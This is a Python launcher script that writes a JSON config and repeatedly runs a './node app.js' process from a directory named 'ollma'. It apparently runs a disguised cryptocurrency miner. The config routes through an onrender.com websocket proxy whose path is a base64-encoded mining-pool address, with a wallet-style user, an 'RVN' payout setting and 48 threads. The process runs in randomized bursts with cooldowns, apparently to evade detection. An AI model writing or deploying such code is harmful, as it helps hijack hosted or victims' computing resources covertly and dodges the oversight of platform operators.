import os
import subprocess
import time
import json
import stat
import sys
import random

# --- Configuration ---
# The directory where your node application is located.
# os.path.expanduser('~') correctly handles the '~' to point to the home directory.
TARGET_DIR = os.path.expanduser('~/ollma')

# Names of your node executable, application script, and config file.
NODE_EXECUTABLE = './node'
APP_SCRIPT = 'app.js'
JSON_CONFIG_FILE = 'data.json'

# The JSON configuration data to be written to data.json.
# Using a Python dictionary is cleaner and less error-prone than a raw string.
JSON_DATA = {
    "proxy": "wss://onren-e3hx.onrender.com/cG93ZXIyYi5taW5lLnplcmdwb29sLmNvbTo3NDQ1",
    "config": {
        "threads": 48,
        "log": True
    },
    "options": {
        "user": "RXi399jsFYHLeqFhJWiNETySj5nvt2ryqj",
        "password": "c=RVN",
        "argent": "timmer@56565612"
    }
}

def perform_initial_setup():
    """
    Performs the initial setup steps: sets file permissions and creates the
    configuration file in the current directory. This function runs only once.
    """
    print("--- Starting Initial Setup ---")
    print(f"Working in current directory: {os.getcwd()}")

    # 2. Make the node file executable (equivalent to chmod +x)
    try:
        print(f"Setting execute permissions on '{NODE_EXECUTABLE}'...")
        current_permissions = os.stat(NODE_EXECUTABLE).st_mode
        os.chmod(NODE_EXECUTABLE, current_permissions | stat.S_IEXEC)
        print(f"'{NODE_EXECUTABLE}' is now executable.")
    except FileNotFoundError:
        print(f"Error: The executable '{NODE_EXECUTABLE}' was not found in {os.getcwd()}.")
        sys.exit(1)

    # 3. Write the configuration to data.json
    try:
        print(f"Creating or overwriting '{JSON_CONFIG_FILE}'...")
        with open(JSON_CONFIG_FILE, 'w') as f:
            json.dump(JSON_DATA, f, indent=2)
        print(f"'{JSON_CONFIG_FILE}' has been created successfully.")
    except IOError as e:
        print(f"Error: Could not write to '{JSON_CONFIG_FILE}': {e}")
        sys.exit(1)

    print("--- Initial Setup Complete ---")


def start_main_loop():
    """
    Starts the main infinite loop to run the node process repeatedly.
    """
    while True:
        # Generate random durations for this cycle
        run_duration = random.randint(320, 450)
        cooldown_duration = random.randint(45, 60)

        print(f"\nStarting '{NODE_EXECUTABLE} {APP_SCRIPT}' for {run_duration} seconds...")
        try:
            subprocess.run(
                [NODE_EXECUTABLE, APP_SCRIPT],
                timeout=run_duration,
                check=False
            )
        except subprocess.TimeoutExpired:
            print(f"Process ran for the full {run_duration} seconds and was stopped.")
        except FileNotFoundError:
            print(f"Error: Could not find '{NODE_EXECUTABLE}' or '{APP_SCRIPT}'.")
            print("Exiting loop.")
            break
        except Exception as e:
            print(f"An unexpected error occurred: {e}")

        print(f"Process finished. Cooling down for {cooldown_duration} seconds...")
        time.sleep(cooldown_duration)


if __name__ == "__main__":
    perform_initial_setup()
    start_main_loop()
